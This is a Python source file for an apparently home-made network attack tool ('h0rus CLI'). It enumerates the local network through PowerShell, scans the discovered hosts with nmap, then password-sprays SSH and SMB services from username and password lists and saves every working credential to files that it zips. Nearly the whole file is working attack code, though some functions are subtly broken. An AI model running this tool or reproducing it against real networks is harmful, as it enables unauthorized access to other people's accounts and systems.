import argparse
import ast
import ipaddress
import json
import os
import re
import subprocess
import sys
import zipfile
import xmltodict
import uuid
import paramiko
from smbprotocol.connection import Connection
from smbprotocol.session import Session
from smbprotocol.tree import TreeConnect
from smbprotocol.exceptions import SMBAuthenticationError, SMBResponseException
class nmapStart:
    def start(path,target):
        command = [
            path,
            "-sS",                  # SYN Scan (Port Tespiti)
            "-sV",                  # Service / Version Detection
            "-O",                   # OS Detection
            "--traceroute",         # Topoloji ve Hop Analizi
            "-oX=scan.xml",         # XML Çıktı Dosyası
            "-iL=nmaptargets.txt",
            target
        ]
        try:
            #running nmap sometimes wants a admin privilige
            process = subprocess.run(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                check=True
            )
            print(f"[+] scan is complete output file scan.xml")
            return True
        
        except subprocess.CalledProcessError as e:
            print(f"[!] Nmap running error: {e.stderr}")
            return False
class nmapAnalyzer():
    
    def load_nmap_xml_turn_dict(xml_input):
        with open(xml_input, 'r', encoding='utf-8') as f:
            xml_data = f.read()
        
                # xmltodict ile XML'i doğrudan Python sözlüğüne çeviriyoruz
        parsed_dict = xmltodict.parse(xml_data)
            
        return parsed_dict
        
    def parse_nmap_dict_full(nmap_dict):
        """
                xmltodict ile çevrilmiş Nmap verisinden Traceroute topolojisini (Edges)
                ve OS, Port, Servis, TTL detaylarını (Node Attributes) çıkarır.
                """
        relations = []
        nodes_metadata = {}  # IP -> {os, open_ports, services, mac, vendor, ttl, traceroute_hops} bilgileri
            
        nmap_run = nmap_dict.get('nmaprun', {})
        hosts = nmap_run.get('host', [])
        
        if isinstance(hosts, dict):
            hosts = [hosts]
        
        for host in hosts:
                    # Sadece ayakta (up) olan host'ları işliyoruz
            status = host.get('status', {}).get('@state')
            if status != 'up':
                continue
        
                    # 1. IP ADRESİ TESPİTİ
            addresses = host.get('address', [])
            target_ip = None
            mac_addr = None
            vendor = None
        
            if isinstance(addresses, dict):
                addresses = [addresses]
        
            for addr in addresses:
                if addr.get('@addrtype') == 'ipv4':
                    target_ip = addr.get('@addr')
                elif addr.get('@addrtype') == 'mac':
                    mac_addr = addr.get('@addr')
                    vendor = addr.get('@vendor', 'Unknown Vendor')
        
            if not target_ip:
                continue
        
                    # 2. İŞLETİM SİSTEMİ TESPİTİ (-O)
            os_name = "N/A"
            os_info = host.get('os', {})
            if os_info:
                os_matches = os_info.get('osmatch', [])
                if isinstance(os_matches, dict):
                    os_matches = [os_matches]
                if os_matches:
                            # En yüksek doğruluk oranına (accuracy) sahip ilk tahmini alıyoruz
                    best_match = os_matches[0]
                    os_name = f"{best_match.get('@name', 'Unknown OS')} (%{best_match.get('@accuracy', '0')} accuracy)"
        
                    # 3. PORT, SERVİS VE PORT BAZLI TTL TESPİTİ (-sS, -sV)
            ports_info = host.get('ports', {}).get('port', [])
            if isinstance(ports_info, dict):
                ports_info = [ports_info]
        
            open_ports = []
            services_summary = []
            observed_ttl = "N/A"
        
            for p in ports_info:
                port_state_obj = p.get('state', {})
                port_state = port_state_obj.get('@state')
        
                        # Nmap'in paket yanıtından yakaladığı TTL (reason_ttl)
                if observed_ttl == "N/A" and '@reason_ttl' in port_state_obj:
                    observed_ttl = int(port_state_obj.get('@reason_ttl'))
        
                if port_state == 'open':
                    port_id = p.get('@portid')
                    proto = p.get('@protocol', 'tcp')
                        
                            # Servis & Versiyon detayları (-sV)
                    service_obj = p.get('service', {})
                    s_name = service_obj.get('@name', 'unknown')
                    s_product = service_obj.get('@product', '')
                    s_version = service_obj.get('@version', '')
                        
                    service_detail = f"{s_name}"
                    if s_product:
                        service_detail += f" ({s_product} {s_version})".strip()
        
                    open_ports.append(f"{port_id}/{proto}")
                    services_summary.append(f"Port {port_id}: {service_detail}")
        
                    # 4. TRACEROUTE HOP / TOPOLOJİ İLİŞKİLERİ VE TTL TESPİTİ
                    
        
                    # Node metadata sözlüğüne ekliyoruz (TTL ve Hop bilgileri eklendi)
            nodes_metadata[target_ip] = {
                "os": os_name,
                "open_ports": open_ports,
                "services": services_summary,
                "mac": mac_addr if mac_addr else "N/A",
                "vendor": vendor if vendor else "N/A",
                "ttl": observed_ttl,
                        
            }
        
            return nodes_metadata


class JsonNmap():
    def JsonNmap():
        
        global metadata
        metadata = (nmapAnalyzer.parse_nmap_dict_full(nmapAnalyzer.load_nmap_xml_turn_dict("scan.xml")))

        
        file = open("nmapports.json", "w")
        data = json.dumps(metadata, indent=4)
        file.write(data + "\n")
        file.close()

class OpenFile():
    def OpenTargets():
        f = open("nmapports.json","r")
        return json.loads(f.read())
    def ParseJson():
        data = OpenFile.OpenTargets()
            
        ip_list = list(data.keys())
                        
        smb_ips=[]
        ssh_ips=[]
        #print(ip_list)
        for ip in ip_list:
            #print(a)
                                
            ip_data = data.get(ip, {})
                        
            ip_ports = ip_data.get("open_ports", [])
            #print("role port values\n")
                        
            #print(ip_ports)
            clean_ports_int = [int(port.split('/')[0]) for port in ip_ports]
            
            
            if 22 in clean_ports_int:
                ssh_ips.append(ip)

            if 135 in clean_ports_int or 445 in clean_ports_int:
                smb_ips.append(ip)

            else:
                continue
    
        return smb_ips,ssh_ips

class PasSpray():
    def ssh():
        @staticmethod
        def check_ssh_login(ip, username, password):
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                client.connect(ip, port=22, username=username, password=password, timeout=3, allow_agent=False, look_for_keys=False)
                client.close()
                return True # Başarılı Spraying
            except paramiko.AuthenticationException:
                return False # Hatalı Parola
            except Exception as e:
                return None # Bağlantı/Timeout Hatası
        
        def Openpass():
            f = open("sshpasslist.txt", "r+")
            return f
        def Openuname():
            f = open("sshuserlist.txt", "r+")
            return f
        
        def sshresults(data):
            with open("sshPasSprayresults.jsonl", "a") as f:
                f.writelines(data)
        
        def resultreset():
            f = open("sshPasSprayresults.jsonl" , "w")
            f.write("")
            f.close()
        def spray():
            resultreset()
            userlist = Openuname()
            userfile = userlist.readlines()
            passlist = Openpass()
            passfile = passlist.readlines()
            smb_ips,ssh_ips = OpenFile.ParseJson()
            for ip in ssh_ips:
                for uname in userfile:
                    for password in passfile:
                        if check_ssh_login(ip , uname, password):
                            print("[!!!] ssh FOUND [!!!] "+ip+" "+"username: "+uname+" password: "+password)
                            payload = {
                                "ip": ip,
                                "username": uname,
                                "password": password
                                }
                            data = json.dumps(payload)
                            sshresults(data)
                
                        else:
                            print("ssh not found [*] ip: "+ip+" username: "+uname+" password: "+password)

        spray()

    def smb():
        def Openpass():
            f = open("smbpasslist.txt", "r+")
            return f
        def Openuname():
            f = open("smbuserlist.txt", "r+")
            return f
        @staticmethod
        def check_smb_auth(target_ip: str, username: str, password: str) -> bool:
                
            formatted_username = username if "\\" in username or "@" in username else f".\\{username}"
            
            
            connection = Connection(uuid.uuid4(), target_ip, port=445)
            
            try:
                connection.connect(timeout=3)
                
               
                session = Session(connection, username=formatted_username, password=password)
                session.connect()
                
                
                tree = TreeConnect(session, f"\\\\{target_ip}\\IPC$")
                tree.connect()
                
                
                tree.disconnect()
                connection.disconnect()
                return True
        
            except SMBAuthenticationError:
               
                connection.disconnect()
                return False
                
            except (SMBResponseException, Exception):
                
                connection.disconnect()
                return False
        
        def resultreset():
            f = open("smbPasSprayresults.jsonl" , "w")
            f.write("")
            f.close()
        
        def smbresults(data):
            with open("smbPasSprayresults.jsonl", "a") as f:
                f.writelines(data)
            
        def spray():
            resultreset()
            userlist = Openuname()
            userfile = userlist.readlines()
            passlist = Openpass()
            passfile = passlist.readlines()
            smb_ips,ssh_ips = OpenFile.ParseJson()
            for ip in smb_ips:
                for uname in userfile:
                    for password in passfile:
                        if check_smb_auth(ip , uname, password):
                            print("[!!!] smb FOUND [!!!] "+ip+" "+"username: "+uname+" password: "+password)
                            payload = {
                                "ip": ip,
                                "username": uname,
                                "password": password
                            }
                            data = json.dumps(payload)
                            smbresults(data)
        
                        else:
                            print("smb not found [*] ip: "+ip+" username: "+uname+" password: "+password)
        spray()
            
class zipped():
    def zip(name):
        dosyalar = ["nmaptargets.txt", "output.json", "scan.xml", "smbPasSprayresults.jsonl", "sshPasSprayresults.jsonl"]
        with zipfile.ZipFile(name, "w", zipfile.ZIP_DEFLATED) as zipf:
            for dosya in dosyalar:
                zipf.write(dosya)
class osStart:

    @staticmethod
    def ipconfig():
        ps_code = "(Get-NetRoute -DestinationPrefix '0.0.0.0/0' -ErrorAction SilentlyContinue).NextHop | Where-Object { $_ -ne '0.0.0.0' } | ConvertTo-Json"
        output = subprocess.check_output(
            ["powershell.exe", "-Command", ps_code], text=True, errors="ignore"
        )
        return "\n++\n" + output

    @staticmethod
    def arp():
        ps_code = "$localIPs = (Get-NetIPAddress -AddressFamily IPv4).IPAddress; Get-NetNeighbor -AddressFamily IPv4 -State Reachable,Stale | Where-Object { $_.IPAddress -notlike '224*' -and $_.IPAddress -notlike '239*' -and $_.IPAddress -notlike '255*' -and $localIPs -notcontains $_.IPAddress } | Group-Object InterfaceAlias | ForEach-Object { $alias = $_.Name; $ipConfig = Get-NetIPConfiguration -InterfaceAlias $alias -ErrorAction SilentlyContinue; [PSCustomObject]@{ Interface = $alias; LocalIP = $ipConfig.IPv4Address.IPAddress; DynamicIPs = ($_.Group.IPAddress | Select-Object -Unique) } } | ConvertTo-Json -Depth 3"
        output = subprocess.check_output(
            ["powershell.exe", "-Command", ps_code], text=True, errors="ignore"
        )
        return "\n+\n" + output

    @staticmethod
    def NetRoute():
        ps_code = "Get-NetRoute | Where-Object { $_.NextHop -ne '0.0.0.0' -and $_.NextHop -ne '::' -and $_.NextHop -notlike '127.*' -and $_.NextHop -notlike '224.*' -and $_.NextHop -notlike '239.*' -and $_.NextHop -ne $_.DestinationPrefix.Split('/')[0] } | Select-Object DestinationPrefix, NextHop | ConvertTo-Json"
        output = subprocess.check_output(
            ["powershell.exe", "-Command", ps_code], text=True, errors="ignore"
        )
        return "\n+++\n" + output

    @staticmethod
    def NetNeighbor():
        ps_code = "Get-NetNeighbor -State Reachable,Stale | Where-Object { $_.IPAddress -notlike '224*' -and $_.IPAddress -notlike '239*' -and $_.IPAddress -notlike '127.*' -and $_.IPAddress -notlike 'ff02*' } | Select-Object -ExpandProperty IPAddress | Select-Object -Unique | ConvertTo-Json"
        output = subprocess.check_output(
            ["powershell.exe", "-Command", ps_code], text=True, errors="ignore"
        )
        return "\n++++\n" + output

    @staticmethod
    def NetIpConfiguration():
        ps_code = "Get-NetIPConfiguration | Select-Object InterfaceAlias, @{N='IPv4Addresses';E={$_.IPv4Address.IPAddress}}, @{N='DNSServers';E={$_.DNSServer.ServerAddresses}} | ConvertTo-Json -Depth 3"
        output = subprocess.check_output(
            ["powershell.exe", "-Command", ps_code], text=True, errors="ignore"
        )
        return "\n+++++\n" + output

    @staticmethod
    def NetTcpConnection():
        ps_code = "Get-NetTCPConnection -State Established | Where-Object { $_.RemoteAddress -ne '0.0.0.0' -and $_.RemoteAddress -ne '127.0.0.1' -and $_.LocalAddress -ne '127.0.0.1' -and $_.RemoteAddress -ne '::1' -and $_.LocalAddress -ne '::1' } | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort | ConvertTo-Json"
        output = subprocess.check_output(
            ["powershell.exe", "-Command", ps_code], text=True, errors="ignore"
        )
        return "\n++++++\n" + output

    @staticmethod
    def forRegex():
        return "\n+++++++\n"

    @staticmethod
    def WinRun():
        return (
            osStart.arp()
            + osStart.ipconfig()
            + osStart.NetRoute()
            + osStart.NetNeighbor()
            + osStart.NetIpConfiguration()
            + osStart.NetTcpConnection()
            + osStart.forRegex()
        )


class osParse:

    class Open:

        @staticmethod
        def openJson():
            if os.path.exists("output.json"):
                with open("output.json", "r", encoding="utf-8") as file:
                    return file.read()
            return ""

    class Regex:

        @staticmethod
        def regex(start, finish, content=None):
            # Eğer içerik verilmediyse dosyadan oku
            if content is None:
                content = osParse.Open.openJson()

            pattern = rf"{re.escape(start)}(.*?){re.escape(finish)}"
            match = re.search(pattern, content, re.DOTALL)
            if match:
                return match.group(1).strip()
            return None

    class Parse:

        @staticmethod
        def Arp():
            s, f = "+", "++"
            data = osParse.Regex.regex(s, f)
            Pdata = json.loads(data) if data else []
            if isinstance(Pdata, dict):
                Pdata = [Pdata]

            interface = [
                item.get("Interface")
                for item in Pdata
                if isinstance(item, dict) and item.get("Interface") is not None
            ]
            allLocalip = [
                item.get("LocalIP")
                for item in Pdata
                if isinstance(item, dict) and item.get("LocalIP") is not None
            ]
            allip = [
                item.get("DynamicIPs")
                for item in Pdata
                if isinstance(item, dict)
                and item.get("DynamicIPs") is not None
            ]

            return (
                f"\ninterfaces\n{str(interface)}\n"
                f"localips\n{str(allLocalip)}\n"
                f"DynamicIps\n{str(allip)}DYEnd"
            )

        @staticmethod
        def Gateway():
            s, f = "++", "+++"
            data = osParse.Regex.regex(s, f)
            cleaned = data.replace('"', "") if data else ""
            Cdata = cleaned.split()
            return f"\nGateway\n{str(Cdata)}GaEnd\n"

        @staticmethod
        def NetRoute():
            s, f = "+++", "++++"
            data = osParse.Regex.regex(s, f)
            Pdata = json.loads(data) if data else []
            if isinstance(Pdata, dict):
                Pdata = [Pdata]
            allNextHop = [
                item.get("NextHop")
                for item in Pdata
                if isinstance(item, dict) and item.get("NextHop") is not None
            ]
            allDestPre = [
                item.get("DestinationPrefix")
                for item in Pdata
                if isinstance(item, dict)
                and item.get("DestinationPrefix") is not None
            ]
            return (
                f"DestinationPrefixes\n{str(allDestPre)}\n"
                f"\nNexthops\n{str(allNextHop)}HopEnd\n"
            )

        @staticmethod
        def NetNeigh():
            s, f = "++++", "+++++"
            data = osParse.Regex.regex(s, f)
            cleaned0 = data.strip("[]'\" ") if data else ""
            cleaned = cleaned0.replace('"', "").replace(",", "")
            Cdata = cleaned.split()
            return f"NetNeighbors\n{str(Cdata)}NeighEnd\n"

        @staticmethod
        def NetIpConf():
            s, f = "+++++", "++++++"
            data = osParse.Regex.regex(s, f)
            Pdata = json.loads(data) if data else []
            if isinstance(Pdata, dict):
                Pdata = [Pdata]

            allinterfaces = [
                item.get("InterfaceAlias")
                for item in Pdata
                if isinstance(item, dict)
                and item.get("InterfaceAlias") is not None
            ]
            allipv4 = [
                item.get("IPv4Addresses")
                for item in Pdata
                if isinstance(item, dict)
                and item.get("IPv4Addresses") is not None
            ]
            alldns = [
                (
                    item.get("DNSServers").get("value")
                    if isinstance(item.get("DNSServers"), dict)
                    else item.get("DNSServers")
                )
                for item in Pdata
                if isinstance(item, dict)
                and item.get("DNSServers") is not None
            ]

            return (
                f"InterfaceAlias\n{str(allinterfaces)}\n"
                f"\nIpv4addresses\n{str(allipv4)}\n"
                f"\nDNSservers\n{str(alldns)}DnsEnd\n"
            )

        @staticmethod
        def NetTcpConn():
            s, f = "++++++", "+++++++"
            data = osParse.Regex.regex(s, f)
            Pdata = json.loads(data) if data else []
            if isinstance(Pdata, dict):
                Pdata = [Pdata]

            alllocaladd = [
                item.get("LocalAddress")
                for item in Pdata
                if isinstance(item, dict)
                and item.get("LocalAddress") is not None
            ]
            alllocalport = [
                item.get("LocalPort")
                for item in Pdata
                if isinstance(item, dict) and item.get("LocalPort") is not None
            ]
            allremoteadd = [
                item.get("RemoteAddress")
                for item in Pdata
                if isinstance(item, dict)
                and item.get("RemoteAddress") is not None
            ]
            allremoteport = [
                item.get("RemotePort")
                for item in Pdata
                if isinstance(item, dict) and item.get("RemotePort") is not None
            ]

            return (
                f"Localaddresses\n{str(alllocaladd)}\n"
                f"\nLocalports\n{str(alllocalport)}\n"
                f"\nRemoteaddresses\n{str(allremoteadd)}\n"
                f"\nRemoteports\n{str(allremoteport)}RemEnd\n"
            )

    class Inspect:

        @staticmethod
        def Arp():
            ndata = osParse.Parse.Arp()
            interfaces = osParse.Regex.regex("interfaces", "localips", ndata)
            localips = osParse.Regex.regex("localips", "DynamicIps", ndata)
            dynamicips = osParse.Regex.regex("DynamicIps", "DYEnd", ndata)

            return {
                "interface": (
                    ast.literal_eval(interfaces) if interfaces else []
                ),
                "local_ips": ast.literal_eval(localips) if localips else [],
                "dynamic_ips": (
                    ast.literal_eval(dynamicips) if dynamicips else []
                ),
            }

        @staticmethod
        def Gateway():
            ndata = osParse.Parse.Gateway()
            gateway = osParse.Regex.regex("Gateway", "GaEnd", ndata)
            return {"gateways": ast.literal_eval(gateway) if gateway else []}

        @staticmethod
        def NetRoute():
            ndata = osParse.Parse.NetRoute()
            DestinationPrefixes = osParse.Regex.regex(
                "DestinationPrefixes", "Nexthops", ndata
            )
            NextHops = osParse.Regex.regex("NextHops", "HopEnd", ndata)
            return {
                "DestinationPre": (
                    ast.literal_eval(DestinationPrefixes)
                    if DestinationPrefixes
                    else []
                ),
                "NextHops": NextHops,
            }

        @staticmethod
        def NetNeigh():
            ndata = osParse.Parse.NetNeigh()
            neighbors = osParse.Regex.regex("NetNeighbors", "NeighEnd", ndata)
            return {
                "neighbors": ast.literal_eval(neighbors) if neighbors else []
            }

        @staticmethod
        def NetIpConf():
            ndata = osParse.Parse.NetIpConf()
            interfacealiases = osParse.Regex.regex(
                "InterfaceAlias", "Ipv4addresses", ndata
            )
            ipv4dds = osParse.Regex.regex(
                "Ipv4addresses", "DNSservers", ndata
            )
            dnsservers = osParse.Regex.regex("DNSservers", "DnsEnd", ndata)

            return {
                "interfacealias": (
                    ast.literal_eval(interfacealiases)
                    if interfacealiases
                    else []
                ),
                "ipv4adds": ast.literal_eval(ipv4dds) if ipv4dds else [],
                "dnsservers": (
                    ast.literal_eval(dnsservers) if dnsservers else []
                ),
            }

        @staticmethod
        def NetTCPConf():
            ndata = osParse.Parse.NetTcpConn()
            localadds = osParse.Regex.regex(
                "Localaddresses", "Localports", ndata
            )
            localports = osParse.Regex.regex(
                "Localports", "Remoteaddresses", ndata
            )
            remoteadds = osParse.Regex.regex(
                "Remoteaddresses", "Remoteports", ndata
            )
            remoteports = osParse.Regex.regex(
                "Remoteports", "RemEnd", ndata
            )

            return {
                "localadds": ast.literal_eval(localadds) if localadds else [],
                "localports": (
                    ast.literal_eval(localports) if localports else []
                ),
                "remoteadds": (
                    ast.literal_eval(remoteadds) if remoteadds else []
                ),
                "remoteports": (
                    ast.literal_eval(remoteports) if remoteports else []
                ),
            }


class os2target:

    @staticmethod
    def _flatten(lst):
        """İç içe gelmiş IP listelerini düzleştirir (Flatten)."""
        flat = []
        for item in lst:
            if isinstance(item, list):
                flat.extend(os2target._flatten(item))
            elif item:
                flat.append(str(item))
        return flat

    @staticmethod
    def getipv4s():
        arp = osParse.Inspect.Arp()
        ipconf = osParse.Inspect.NetIpConf()
        neigh = osParse.Inspect.NetNeigh()
        conn = osParse.Inspect.NetTCPConf()

        ip1 = os2target._flatten(ipconf.get("ipv4adds", []))
        ip2 = os2target._flatten(arp.get("dynamic_ips", []))
        ip3 = os2target._flatten(neigh.get("neighbors", []))
        ip4 = os2target._flatten(conn.get("remoteadds", []))

        # Tüm IP'leri tekleştir (Hashable hale getirildi)
        iplist = list(set(ip2))
        return iplist

    @staticmethod
    def openFile(data_list):
        output = "\n".join(data_list)
        with open("nmaptargets.txt", "w", encoding="utf-8") as f:
            f.write(output)
        print(f"[+] {len(data_list)} count of IP writed on the 'nmaptargets.txt' file")

    @staticmethod
    def inspect():
        subnetted = []
        ips = os2target.getipv4s()
        for ip in ips:
            clean_ip = ip.strip()
            try:
                ip_obj = ipaddress.ip_address(clean_ip)
                if isinstance(
                    ip_obj, ipaddress.IPv4Address
                ) and not ip_obj.is_loopback:
                    subnetted.append(clean_ip)
            except ValueError:
                continue
        return subnetted

    @staticmethod
    def main():
        ips = os2target.inspect()
        os2target.openFile(ips)


class osOutput:

    @staticmethod
    def writeJson():
        with open("output.json", "w+", encoding="utf-8") as file:
            file.write(osStart.WinRun())
        print("[+] Powershell command outputs are writed in output.json")


def main():
    parser = argparse.ArgumentParser(description="(h0rus CLI)")
    parser.add_argument(
        "-t",
        "--target",
        type=str,
        help="ip subnet EX: 192.168.2.1/24",
    )
    parser.add_argument(
        "-p",
        "--path",
        type=str,
        help="nmap path / if you installed nmap on the computer just type nmap here",
    )
    parser.add_argument(
        "-o",
        "--output",
        type=str,
        help="output zip file name EX: otuput.zip"
    )
    args = parser.parse_args()

    print("[*] OS commands are running...")
    osOutput.writeJson()

    print("[*] command outputs are parsing")
    os2target.main()
    print("[*] nmap scan is starting")
    nmapStart.start(args.path , args.target)
    JsonNmap.JsonNmap()
    PasSpray.smb()
    PasSpray.ssh()
    zipped.zip(args.output)
    print("[*] output files are zipped")
    print(f"output file is ready: {args.output}")    

if __name__ == "__main__":
    main()